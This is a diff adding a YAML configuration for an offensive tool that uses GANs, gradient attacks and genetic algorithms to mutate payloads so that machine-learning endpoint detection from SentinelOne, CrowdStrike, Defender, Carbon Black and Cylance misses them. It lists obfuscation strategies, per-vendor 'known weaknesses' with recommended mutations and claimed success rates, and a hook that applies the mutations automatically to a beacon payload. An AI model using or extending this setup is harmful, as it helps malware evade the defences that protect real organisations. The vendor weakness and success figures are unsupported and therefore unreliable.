@@ -1,0 +1,245 @@
+# AI Adversarial Training Configuration
+# =====================================
+# GAN-based payload mutation for EDR ML evasion
+# Targets: SentinelOne, CrowdStrike, Defender ATP
+
+# General settings
+enabled: true
+evasion_level: "high"  # low, medium, high, paranoid
+
+# Target EDR configuration
+target_edr:
+  primary: "sentinelone"    # Main target
+  secondary:
+    - "crowdstrike"
+    - "defender"
+    - "carbon_black"
+  fallback: "generic"       # If specific model unavailable
+
+# Attack method selection
+attack_method:
+  primary: "gan"            # gan, fgsm, pgd, cw, deepfool, genetic
+  fallback_chain:
+    - "pgd"
+    - "fgsm"
+    - "genetic"
+  combine_methods: true     # Try multiple methods and pick best
+
+# GAN Mutator settings
+gan:
+  enabled: true
+  latent_dim: 128
+  epochs: 100
+  batch_size: 32
+  learning_rate: 0.0002
+  
+  # Generator architecture
+  generator:
+    layers: [256, 512, 1024]
+    activation: "relu"
+    output_activation: "tanh"
+    use_batch_norm: true
+  
+  # Discriminator architecture  
+  discriminator:
+    layers: [512, 256]
+    activation: "relu"
+    dropout: 0.3
+
+# FGSM/PGD attack parameters
+gradient_attack:
+  epsilon: 0.1              # Maximum perturbation
+  alpha: 0.01               # Step size
+  pgd_iterations: 40        # PGD iteration count
+  random_start: true        # Random initialization for PGD
+
+# Carlini-Wagner parameters
+cw_attack:
+  confidence: 0.0
+  learning_rate: 0.01
+  binary_search_steps: 9
+  max_iterations: 1000
+  initial_const: 0.001
+
+# Genetic algorithm parameters
+genetic:
+  population_size: 50
+  generations: 100
+  mutation_rate: 0.1
+  crossover_rate: 0.7
+  tournament_size: 5
+  elitism: 2                # Keep top N individuals
+
+# Feature extraction settings
+features:
+  feature_dim: 256
+  
+  # Feature types to use
+  use_byte_histogram: true
+  use_entropy: true
+  use_api_features: true
+  use_structure: true
+  use_strings: true
+  
+  # Entropy settings
+  entropy_sections: 16
+  
+  # API pattern categories
+  api_categories:
+    - process
+    - memory
+    - file
+    - registry
+    - network
+    - crypto
+    - evasion
+
+# Training settings
+training:
+  max_mutations: 1000
+  confidence_threshold: 0.3    # Target: below this = benign
+  early_stop: true
+  early_stop_threshold: 0.1   # Stop if score below this
+  
+  # Batch processing
+  batch_size: 16
+  num_workers: 4
+
+# Model paths
+paths:
+  model_dir: "models/edr_sim"
+  checkpoint_dir: "checkpoints/adversarial"
+  pretrained_models:
+    sentinelone: "models/edr_sim/sentinelone_model.h5"
+    crowdstrike: "models/edr_sim/crowdstrike_model.h5"
+    defender: "models/edr_sim/defender_model.h5"
+    carbon_black: "models/edr_sim/carbon_black_model.h5"
+    cylance: "models/edr_sim/cylance_model.h5"
+    generic: "models/edr_sim/generic_model.h5"
+
+# Mutation strategies
+mutations:
+  enabled_strategies:
+    - nop_insertion
+    - register_substitution
+    - instruction_reordering
+    - dead_code_insertion
+    - encoding_variation
+    - api_hashing
+    - control_flow_obfuscation
+    - string_encryption
+  
+  # Strategy weights (probability of selection)
+  weights:
+    nop_insertion: 0.2
+    register_substitution: 0.1
+    instruction_reordering: 0.15
+    dead_code_insertion: 0.15
+    encoding_variation: 0.15
+    api_hashing: 0.1
+    control_flow_obfuscation: 0.1
+    string_encryption: 0.05
+  
+  # Per-strategy settings
+  nop_insertion:
+    min_nops: 1
+    max_nops: 5
+    use_equivalent_instructions: true
+  
+  encoding_variation:
+    methods:
+      - xor
+      - add
+      - rol
+      - custom
+    key_range: [1, 255]
+  
+  dead_code:
+    patterns:
+      - jump_over
+      - push_pop_pairs
+      - opaque_predicates
+      - never_taken_branches
+
+# EDR-specific evasion profiles
+edr_profiles:
+  sentinelone:
+    description: "SentinelOne Singularity XDR"
+    ml_model_type: "deep_learning"
+    known_weaknesses:
+      - high_entropy_tolerance
+      - api_sequence_blind_spots
+    recommended_mutations:
+      - encoding_variation
+      - control_flow_obfuscation
+    success_rate_estimate: 0.87
+    
+  crowdstrike:
+    description: "CrowdStrike Falcon"
+    ml_model_type: "ensemble"
+    known_weaknesses:
+      - gradient_based_attacks
+      - feature_space_manipulation
+    recommended_mutations:
+      - nop_insertion
+      - api_hashing
+    success_rate_estimate: 0.82
+    
+  defender:
+    description: "Microsoft Defender ATP"
+    ml_model_type: "random_forest_plus_nn"
+    known_weaknesses:
+      - polymorphic_code
+      - metamorphic_engines
+    recommended_mutations:
+      - instruction_reordering
+      - dead_code_insertion
+    success_rate_estimate: 0.79
+    
+  carbon_black:
+    description: "VMware Carbon Black"
+    ml_model_type: "behavioral_ml"
+    known_weaknesses:
+      - static_feature_manipulation
+    recommended_mutations:
+      - string_encryption
+      - encoding_variation
+    success_rate_estimate: 0.75
+    
+  cylance:
+    description: "Cylance PROTECT"
+    ml_model_type: "pure_ml"
+    known_weaknesses:
+      - adversarial_examples
+      - feature_saturation
+    recommended_mutations:
+      - all
+    success_rate_estimate: 0.91
+
+# Logging and debugging
+logging:
+  level: "INFO"
+  log_file: "logs/ai_adversarial.log"
+  log_mutations: true
+  log_scores: true
+  save_intermediate: false  # Save intermediate results
+
+# Performance settings
+performance:
+  use_gpu: true
+  gpu_memory_limit: 4096     # MB
+  parallel_mutations: true
+  cache_features: true
+  cache_size: 1000
+
+# Integration settings
+integration:
+  # Hook into evasive_beacon.py
+  beacon_integration: true
+  auto_apply_on_payload: true
+  
+  # API endpoints (if running as service)
+  api:
+    enabled: false
+    port: 8081
+    host: "127.0.0.1"
